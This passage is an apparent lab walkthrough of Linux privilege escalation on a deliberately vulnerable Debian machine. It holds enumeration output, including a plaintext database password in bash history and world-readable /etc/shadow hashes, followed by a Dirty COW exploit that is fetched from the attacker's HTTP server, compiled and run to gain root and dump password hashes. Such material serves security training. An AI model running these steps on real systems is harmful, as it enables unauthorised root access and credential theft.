root         6  0.0  0.0      0     0 ?        S    06:09   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    06:09   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    06:09   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    06:09   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    06:09   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    06:09   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    06:09   0:00 [xenwatch]
root        13  0.0  0.0      0     0 ?        S    06:09   0:00 [xenbus]
root        14  0.0  0.0      0     0 ?        S    06:09   0:00 [sync_supers]
root        15  0.0  0.0      0     0 ?        S    06:09   0:00 [bdi-default]
root        16  0.0  0.0      0     0 ?        S    06:09   0:00 [kintegrityd/0]
root        17  0.0  0.0      0     0 ?        S    06:09   0:00 [kblockd/0]
root        18  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpid]
root        19  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpi_notify]
root        20  0.0  0.0      0     0 ?        S    06:09   0:00 [kacpi_hotplug]
root        21  0.0  0.0      0     0 ?        S    06:09   0:00 [kseriod]
root        23  0.0  0.0      0     0 ?        S    06:09   0:00 [kondemand/0]
root        24  0.0  0.0      0     0 ?        S    06:09   0:00 [khungtaskd]
root        25  0.0  0.0      0     0 ?        S    06:09   0:00 [kswapd0]
root        26  0.0  0.0      0     0 ?        SN   06:09   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        S    06:09   0:00 [aio/0]
root        28  0.0  0.0      0     0 ?        S    06:09   0:00 [crypto/0]
root       140  0.0  0.0      0     0 ?        S    06:09   0:00 [ata/0]
root       141  0.0  0.0      0     0 ?        S    06:09   0:00 [ata_aux]
root       142  0.0  0.0      0     0 ?        S    06:09   0:00 [scsi_eh_0]
root       143  0.0  0.0      0     0 ?        S    06:09   0:00 [scsi_eh_1]
root       173  0.0  0.0      0     0 ?        S    06:09   0:00 [kjournald]
root       236  0.0  0.0      0     0 ?        S    06:09   0:00 [flush-202:0]
root       238  0.0  0.1  16916   852 ?        S<s  06:09   0:00 udevd --daemon
root       363  0.0  0.0      0     0 ?        S    06:09   0:00 [kpsmoused]
root       875  0.0  0.1  16912   772 ?        S<   06:10   0:00 udevd --daemon
root       876  0.0  0.1  16912   700 ?        S<   06:10   0:00 udevd --daemon
root      1192  0.0  0.2   6796  1016 ?        Ss   06:11   0:00 dhclient -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1257  0.0  0.0      0     0 ?        S    06:11   0:00 [rpciod/0]
root      1259  0.0  0.0      0     0 ?        S<   06:11   0:00 [kslowd000]
root      1260  0.0  0.0      0     0 ?        S<   06:11   0:00 [kslowd001]
root      1261  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsiod]
root      1268  0.0  0.1  27064   588 ?        Ss   06:11   0:00 /usr/sbin/rpc.idmapd
root      1481  0.0  0.3  54336  1664 ?        Sl   06:11   0:00 /usr/sbin/rsyslogd -c4
root      1581  0.0  0.1   3960   648 ?        Ss   06:11   0:00 /usr/sbin/acpid
root      1615  0.0  0.6  71424  3260 ?        Ss   06:11   0:00 /usr/sbin/apache2 -k start
root      1769  0.0  0.2  22468  1072 ?        Ss   06:11   0:00 /usr/sbin/cron
root      1795  0.0  0.0      0     0 ?        S    06:11   0:00 [lockd]
root      1800  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd4]
root      1801  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1802  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1803  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1804  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1805  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1806  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1807  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1808  0.0  0.0      0     0 ?        S    06:11   0:00 [nfsd]
root      1818  0.0  0.0  14668   436 ?        Ss   06:11   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1844  0.0  0.2  61864  1308 ?        Ss   06:11   0:00 nginx: master process /usr/sbin/nginx
root      1865  0.0  0.2  49224  1164 ?        Ss   06:11   0:00 /usr/sbin/sshd
root      1868  0.0  0.2   9180  1396 ?        S    06:11   0:00 /bin/sh /usr/bin/mysqld_safe
root      2025  0.0  4.7 163420 24124 ?        Sl   06:11   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2026  0.0  0.1   3896   644 ?        S    06:11   0:00 logger -t mysqld -p daemon.error
root      2458  0.0  0.1   5972   636 tty1     Ss+  06:11   0:00 /sbin/getty 38400 tty1
root      2459  0.0  0.1   5972   632 tty2     Ss+  06:11   0:00 /sbin/getty 38400 tty2
root      2460  0.0  0.1   5972   632 tty3     Ss+  06:11   0:00 /sbin/getty 38400 tty3
root      2461  0.0  0.1   5972   636 tty4     Ss+  06:11   0:00 /sbin/getty 38400 tty4
root      2462  0.0  0.1   5972   632 tty5     Ss+  06:11   0:00 /sbin/getty 38400 tty5
root      2463  0.0  0.1   5972   636 tty6     Ss+  06:11   0:00 /sbin/getty 38400 tty6
root      2476  0.0  0.6  70544  3292 ?        Ss   06:11   0:00 sshd: user [priv]
user      2990  0.0  0.1   7592   856 pts/0    S+   06:42   0:00 grep root
user@debian:~$ crontab -l
no crontab for user
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
user@debian:~$ who
user     pts/0        2024-02-01 06:11 (ip-10-17-107-227.eu-west-1.compute.internal)
user@debian:~$ w
 07:51:06 up  1:41,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    ip-10-17-107-227 06:11    0.00s  0.02s  0.00s w
user@debian:~$ last

wtmp begins Thu Feb  1 06:25:03 2024
user@debian:~$ cat ~/.bash_history
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
user@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
user@debian:~$ ls -ahlR /root/
ls: cannot open directory /root/: Permission denied
user@debian:~$ ls -ahlR /root/
ls: cannot open directory /root/: Permission denied
user@debian:~$ find / -type d -writable 2>/dev/null
/var/tmp
/var/lock
/tmp
/home/user
/home/user/tools
/home/user/tools/suid
/home/user/tools/suid/exim
/home/user/tools/privesc-scripts
/home/user/tools/nginx
/home/user/tools/sudo
/home/user/tools/mysql-udf
/home/user/tools/kernel-exploits
/home/user/tools/kernel-exploits/dirtycow
/home/user/tools/kernel-exploits/linux-exploit-suggester-2
/home/user/.john
/home/user/.irssi
/dev/shm
/proc/2518/task/2518/fd
/proc/2518/fd
user@debian:~$ find / -type d -perm -222 2>/dev/null
/var/tmp
/var/lock
/tmp
/dev/shm
user@debian:~$ find / -perm -o+w -type d 2>/dev/null 
/var/tmp
/var/lock
/tmp
/dev/shm
user@debian:~$ find / -perm -o+w -type f -ls 2>/dev/null | grep /etc
1240768    4 -rw-r--rw-   1 root     root          492 May 14  2017 /etc/exports
1240412    4 -rwxr-xrwx   1 root     root          801 May 14  2017 /etc/init.d/rc.local
1241131    4 -rw-r--rw-   1 root     root         1009 Aug 25  2019 /etc/passwd
1241191    4 -rw-r--rw-   1 root     shadow        837 Aug 25  2019 /etc/shadow
user@debian:~$ find / -type f -perm -u=s -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Feb 15  2011 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
user@debian:~$ find / -type f -perm -4000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Feb 15  2011 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
user@debian:~$ find / -type f -perm -02000 -ls 2>/dev/null
809079   20 -rwxr-sr-x   1 root     shadow      19528 Feb 15  2011 /usr/bin/expiry
812477  112 -rwxr-sr-x   1 root     ssh        108600 Apr  2  2014 /usr/bin/ssh-agent
811143   12 -rwxr-sr-x   1 root     tty         11000 Jun 17  2010 /usr/bin/bsd-write
811188   36 -rwxr-sr-x   1 root     crontab     35040 Dec 18  2010 /usr/bin/crontab
809082   60 -rwxr-sr-x   1 root     shadow      56976 Feb 15  2011 /usr/bin/chage
808606   12 -rwxr-sr-x   1 root     tty         12000 Jan 25  2011 /usr/bin/wall
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
465181   32 -rwxr-sr-x   1 root     shadow      31864 Oct 17  2011 /sbin/unix_chkpwd
user@debian:~$ find / -type f -perm -g=s -ls 2>/dev/null
809079   20 -rwxr-sr-x   1 root     shadow      19528 Feb 15  2011 /usr/bin/expiry
812477  112 -rwxr-sr-x   1 root     ssh        108600 Apr  2  2014 /usr/bin/ssh-agent
811143   12 -rwxr-sr-x   1 root     tty         11000 Jun 17  2010 /usr/bin/bsd-write
811188   36 -rwxr-sr-x   1 root     crontab     35040 Dec 18  2010 /usr/bin/crontab
809082   60 -rwxr-sr-x   1 root     shadow      56976 Feb 15  2011 /usr/bin/chage
808606   12 -rwxr-sr-x   1 root     tty         12000 Jan 25  2011 /usr/bin/wall
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
465181   32 -rwxr-sr-x   1 root     shadow      31864 Oct 17  2011 /sbin/unix_chkpwd
user@debian:~$ mount
/dev/xvda1 on / type ext3 (rw,errors=remount-ro)
tmpfs on /lib/init/rw type tmpfs (rw,nosuid,mode=0755)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
udev on /dev type tmpfs (rw,mode=0755)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=620)
debugfs on /sys/kernel/debug type debugfs (rw)
rpc_pipefs on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw)
nfsd on /proc/fs/nfsd type nfsd (rw)
user@debian:~$ df -h
Filesystem            Size  Used Avail Use% Mounted on
/dev/xvda1             19G  984M   17G   6% /
tmpfs                 248M     0  248M   0% /lib/init/rw
udev                  243M  100K  243M   1% /dev
tmpfs                 248M     0  248M   0% /dev/shm
user@debian:~$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
proc    /proc   proc    defaults        0 0
# / was on /dev/sda1 during installation
UUID=be5bb36f-7bb4-4900-b459-196278f714b6       /       ext3    errors=remount-ro       0 1
# swap was on /dev/sda5 during installation
UUID=468658fa-a304-4ed0-981a-d725bf98a790       none    swap    sw      0 0
#/dev/scd0      /media/cdrom0   udf,iso9660     user,noauto     0 0
debugfs /sys/kernel/debug/      debugfs defaults        0 0


```
*************************************************************************************************************************

```
TCM@debian:/tmp$ `ls /home/user/tools/linux-exploit-suggester/`
linux-exploit-suggester.sh
TCM@debian:/tmp$ `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

TCM@debian:/tmp$ 


# We saw above that there is suggestion of `Dirty Cow` exploit, so lets download it and run exploit

# We found a exploit for this version
https://www.exploit-db.com/exploits/40839

`Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) `

# We can go through comments provided in code, we understand that it creates and a new user named firefart which we can switch

    //
    // This exploit uses the pokemon exploit of the dirtycow vulnerability
    // as a base and automatically generates a new passwd line.
    // The user will be prompted for the new password when the binary is run.
    // The original /etc/passwd file is then backed up to /tmp/passwd.bak
    // and overwrites the root account with the generated line.
    // After running the exploit you should be able to login with the newly
    // created user.
    //
    // To use this exploit modify the user values according to your needs.
    //   The default is "firefart".
    //
    // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
    //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
    //
    // Compile with:
    //   gcc -pthread dirty.c -o dirty -lcrypt
    //
    // Then run the newly create binary by either doing:
    //   "./dirty" or "./dirty my-new-password"
    //
    // Afterwards, you can either "su firefart" or "ssh firefart@..."
    //
    // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
    //   mv /tmp/passwd.bak /etc/passwd
    //
    // Exploit adopted by Christian "FireFart" Mehlmauer
    // https://firefart.at
    //


┌──(kali㉿kali)-[~/Downloads]
└─$ `mv 40839.c dirtcowexploit.c`                                 

┌──(kali㉿kali)-[~/Downloads]
└─$ `python -m http.server 80`

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.166.20 - - [28/Jan/2024 03:11:06] "GET /dirtcowexploit.c HTTP/1.0" 200 -

TCM@debian:~$ `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/`
--2024-01-28 03:11:04--  http://10.17.107.227/dirtcowexploit.c
Connecting to 10.17.107.227:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/x-csrc]
Saving to: “/tmp/dirtcowexploit.c”

100%[=================================================================================================================================================================================================>] 5,006       --.-K/s   in 0s      

2024-01-28 03:11:05 (475 MB/s) - “/tmp/dirtcowexploit.c” saved [5006/5006]

TCM@debian:~$ 

TCM@debian:~$ `cd /tmp`
TCM@debian:/tmp$ `ls`
backup.tar.gz  dirtcowexploit.c  useless
TCM@debian:/tmp$ `gcc dirtcowexploit.c -pthread -o dirty -lcrypt`
TCM@debian:/tmp$ `ls`
backup.tar.gz  dirtcowexploit.c  dirty  useless
TCM@debian:/tmp$ `./dirty`
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fihSSIT3K/md.:0:0:pwned:/root:/bin/bash
TCM@debian:/tmp$ `su firefart`
Password: 
firefart@debian:/tmp# `id`
uid=0(firefart) gid=0(root) groups=0(root)
firefart@debian:/tmp# `cat /etc/shadow`
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::

# DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!

firefart@debian:/tmp# `mv /tmp/passwd.bak /etc/passwd`
firefart@debian:/tmp# 


```
****************************************************************






